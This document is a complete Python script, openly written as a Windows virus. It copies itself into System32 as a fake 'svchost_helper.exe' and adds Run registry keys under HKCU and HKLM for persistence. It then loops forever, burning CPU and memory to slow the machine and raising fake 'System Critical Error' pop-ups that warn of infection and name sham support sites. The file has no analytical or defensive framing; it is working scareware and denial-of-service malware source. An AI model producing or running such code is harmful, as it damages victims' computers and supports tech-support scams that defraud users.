import os
import sys
import shutil
import subprocess
import time
import threading
import random

# Configuration
SYSTEM32_PATH = os.path.join(os.environ['SYSTEMROOT'], 'System32')
FAKE_SYSTEM_NAME = "svchost_helper.exe"
TARGET_PATH = os.path.join(SYSTEM32_PATH, FAKE_SYSTEM_NAME)

# Fake warning messages
WARNINGS = [
    "CRITICAL ALERT: Your system has been infected!",
    "WARNING: Spyware detected. Immediate action required.",
    "ERROR: System files corrupted. Contact support immediately.",
    "ALERT: Personal data is being stolen. Click here to stop.",
    "VIRUS DETECTED: Your computer is at risk."
]

SITES = [
    "www.windows-security-alert.com",
    "www.system-failure-detected.net",
    "www.critical-error-fix.org",
    "www.microsoft-support-scan.com"
]

def lag_system():
    """Consumes CPU and Memory to cause lag."""
    while True:
        # Create a massive list to consume memory
        junk = [0] * 10000000
        # Perform useless calculations to consume CPU
        for i in range(1000000):
            _ = i * i
        time.sleep(0.1)

def show_fake_warnings():
    """Opens endless pop-up windows with fake warnings."""
    while True:
        msg = random.choice(WARNINGS)
        site = random.choice(SITES)
        # Using VBScript to create a popup that looks like a system error
        script = f'''
        msg = "{msg}\\n\\nSource: {site}"
        title = "System Critical Error"
        MsgBox msg, 16, title
        '''
        try:
            # Create a temporary vbs file to run the popup
            vbs_path = os.path.join(os.environ['TEMP'], 'tmp_popup.vbs')
            with open(vbs_path, 'w') as f:
                f.write(script)
            subprocess.call(['cscript', '//nolog', vbs_path])
            os.remove(vbs_path)
        except:
            pass
        time.sleep(1)

def install_virus():
    """Copies self to System32 and adds to Registry."""
    current_script = sys.argv[0]
    
    # If not already in System32, install
    if os.path.abspath(current_script) != os.path.abspath(TARGET_PATH):
        try:
            # Copy to System32
            shutil.copy(current_script, TARGET_PATH)
            
            # Add to Registry for persistence (Run keys)
            reg_command = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsSecurityHelper" /t REG_SZ /d "{TARGET_PATH}" /f'
            subprocess.call(reg_command, shell=True)
            
            reg_command_system = f'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsSecurityHelper" /t REG_SZ /d "{TARGET_PATH}" /f'
            subprocess.call(reg_command_system, shell=True)
            
            # Launch the newly copied virus
            subprocess.Popen(TARGET_PATH)
            sys.exit(0)
        except Exception as e:
            print(f"Installation failed: {e}")
            sys.exit(1)

def main():
    # Check if we are the installed version
    if os.path.abspath(sys.argv[0]) == os.path.abspath(TARGET_PATH):
        # Start malicious activities
        threading.Thread(target=lag_system, daemon=True).start()
        threading.Thread(target=show_fake_warnings, daemon=True).start()
        # Keep the main thread alive
        while True:
            time.sleep(10)
    else:
        # First run: Install and exit
        install_virus()

if __name__ == "__main__":
    main()
